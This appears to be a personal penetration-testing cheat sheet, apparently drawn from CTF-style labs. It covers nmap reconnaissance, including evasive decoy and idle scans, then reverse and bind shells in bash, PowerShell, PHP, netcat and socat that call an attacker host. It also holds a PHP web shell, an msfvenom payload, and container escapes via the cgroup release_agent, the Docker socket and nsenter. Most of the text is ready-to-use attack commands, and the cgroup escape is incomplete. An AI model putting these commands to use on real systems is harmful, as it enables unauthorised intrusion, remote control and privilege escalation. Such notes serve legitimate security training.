# Reconnaissance

## Passive

## Active

### Host discovery

#### Host discovery via ARP Scan

Scan hosts in local subnet:

##### Use arp-scan

`arp-scan -l`

`arp-scan -l -I eth0`

##### Use nmap

`nmap -sn -PR <targets>`

#### Host discovery via ICMP scan

##### ICMP Ping scan (ICMP Type8/0):

`nmap -sn -PE <targets>`

##### ICMP Timestamp (ICMP Type 13/14):

`nmap -sn -PP <targets>`

##### ICMP Address Mask (ICMP Type 17/18):

`nmap -sn -PM <targets>`

#### Host discovery via TCP/UDP

##### TCP SYN ping (<ports> optional; port 80 by default):

`nmap -sn -PS<ports> <targets>`

##### TCP ACK ping (<ports> optional; port 80 by default, needs root priv):

`nmap -sn -PA<ports> <targets>`

##### UDP ping

`nmap -sn -PU <targets>`

##### masscan

To use masscan as host discovery we limit ports with `-p`:

`masscan -p<port> <targets>`

#### Host discovery via Reverse-DNS Lookup

Query DNS server even for offline hosts:

`nmap -sn -R <targets>`

### Port scan

#### TCP SYN scan

##### Regular scans

- Scan 100 most common ports in random order:

  `nmap -sS -F <target>`

- Scan 1000 most common ports in random order:

  `nmap -sS <target>`

- Scan all ports in random order:

  `nmap -sS -p- <target>`

- Scan 100 most common ports (-F) in paranoid mode (-T0):

  `namp -sS -F -T0 <target>`

##### Advanced scans

- Null Scan - no flags sent. No reply port open|filtered:

  `nmap -sN <target>`

- FIN Scan - FIN flag sent. No reply port open|filtered:

  `nmap -sF <target>`

- Xmas Scan - FIN, PSH, URG flags sent.  No reply port open|filtered:

  `nmap -sX <target>`

- ACK Scan - ACK flag send. RST on open|closed port. Will detect firewall rules, by marking open/closed ports as unfiltered:

  `nmap -sA <target>`

- Window Scan - like ACK scan, but window field is checked. Will detect firewall rules, by marking open/closed ports as closed:

  `nmap -sW <target>`

- Spoofed scan - sends a packet with a spoofed source IP address to the target machine and intercepts response by monitoring replies sent to spoofed IP

  `nmap -e <NET_INTERFACE> -Pn -S <SPOOFED_IP> <target>`

- Decoy scan - hides among spoofed IPs making it harder to detect orgin of portscan

  `nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.51.159`

- Idle/zombie scan - uses IP ID of zombie host while spoofing it's address to scan target. Zombie host must be 100% idle, like a network printer.

  `nmap -sI <ZOMBIE_IP> <target>`

#### UDP scan

Scan 100 most common ports in random order:

`nmap -sU -F <target>`

### Service/OS enumeration

#### Service detection

Full connect port scan with version detection. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9. 

`nmap -sV --version-light <target>`

#### OS detection

`nmap -sS -O <target>`

#### Custom scripts / vulnerability detection

All scripts (600+) are located in `/usr/share/nmap/scripts`.

- Use default scripts:

  `nmap -sS -sC <target>`

- Discovery scan - retrieve accessible information, such as database tables and DNS names:

  `nmap -sS --script discovery <target>`

- External scan - checks using a third-party service, such as Geoplugin and Virustotal (ie. dns-blacklists):

  `nmap -sS --script external <target>`

- Malware/backdor scan:

  `nmap -sS --script malware <target>`

- Vulnerability scan:

  `nmap -sS --script vuln <target>`

#### Output handling

- Normal - on screen, output:

  `nmap -sS -oN <target>`

- Gepable - one line for Up/Down, one line for ports report:

  `nmap -sS -oG <target>`

- XML - XML format:

  `nmap -sS -oX <target>`

- Script Kiddie special 31337 mode, just for laughs:
  
  `nmap -sS -oS <target>`

# Remote shell

## Bind shells

### Netcat bind shell

`nc -lvnp 1234 -e "cmd.exe"`

### Socat bind shell

- Linux target:

  `socat TCP-L:1234 EXEC:"bash -li"`

- Windows target:

  `socat TCP-L:1234 EXEC:"powershell.exe,pipes"`

  We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

- Attackbox connect command:

  `socat TCP:<TARGETIP>:1234 -`

## Reverse shells

### Bash reverse shell

The simplest method is to use bash, which is available on almost all Linux machines. This script was tested on Ubuntu 18.04, but not all versions of bash support this function:

`/bin/bash -i >& /dev/tcp/<ATTACKBOXIP>/9999 0>&1`

or

```
exec 5<>/dev/tcp/<ATTACKBOXIP>/9999
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Windows powershell

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### PHP reverse shell

If the target machine is a web server that supports PHP, this language will be an excellent choice for a reverse shell:

`php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

If this does not work, you can try replacing &3 with consecutive file descriptors.

### PHP web shell

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

### Netcat reverse shell

#### Setup listener:

`nc -lvnp 1234`

#### Option 1 with -e:

`nc <ATTACKBOXIP> 1234 -e /bin/bash`

#### Option 2 without -e:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKBOXIP> 1234 >/tmp/f`

### Socat reverse shell

#### Setup basic listener:

`socat TCP-L:1234 -`

#### Setup fully stable listener:

`socat TCP-L:1234 FILE:``tty``, raw,echo=0`

#### Windows target (for basic listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:powershell.exe,pipes`

#### Linux target (for basic listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:"bash -li"`

#### Linux target (for fully stable listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Socat encrypted shells

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

### Stablize remote shell

#### Use Python

To "stabilize your shell" for easier ability in typing commands, you can use the usual Python upgrade trick (assuming you are running in a bash shell):

- (on the reverse shell) `python3 -c "import pty; pty.spawn('/bin/bash')"`
- (on the reverse shell) `export TERM=xterm`
- (press `Ctrl+Z` on your keyboard)
- (on your local host) `stty raw -echo; fg`
- (press `Enter` on your keyboard)

You now have a stable shell, where you can safely use the left-and-right arrow keys to move around your input, up-and-down arrow keys to revisit command history, Tab for autocomplete and safely Ctrl+C to stop running programs!

#### Use rlwrap

1. Setup listener:
   This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
   
   `rlwrap nc -lvnp 1234`

2. Stabilize by using the same trick as in step three of the previous technique:

- (press `Ctrl+Z` on your keyboard)
- (on your local host) `stty raw -echo; fg`
- (press `Enter` on your keyboard)

## Shell payloads

### msfvenom

The standard syntax for msfvenom:

`msfvenom -p <PAYLOAD> <OPTIONS>`

#### Windows .exe

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ATTACKBOXIP> LPORT=1234`

### Staged vs stageless

- Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler.
- Stageless payloads entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

# Priv escalation

## Dirty c0w(?)

## Check sudo

sudo -l

## Privlidged container escape


### Exploit privlidged capabilities


1. capsh --print
Check capabilities first

2.
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.

### Exploiting docker socket

1. ls -la /var/run | grep sock
srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock

confirm you can run docker commands (be root in container or be in docker group as a lower-privileged user)
 
2. docker run -v /:/mnt --rm -it alpine chroot /mnt sh

### Exposed Docker port 2375

1. curl http://10.10.85.243:2375/version

2. docker -H tcp://10.10.85.243:2375 ps

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further.

### Namespace abuse

For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host, meaning that we can launch new commands such as a bash shell on the host. 

Use the following exploit: nsenter --target 1 --mount --uts --ipc --net /bin/bash
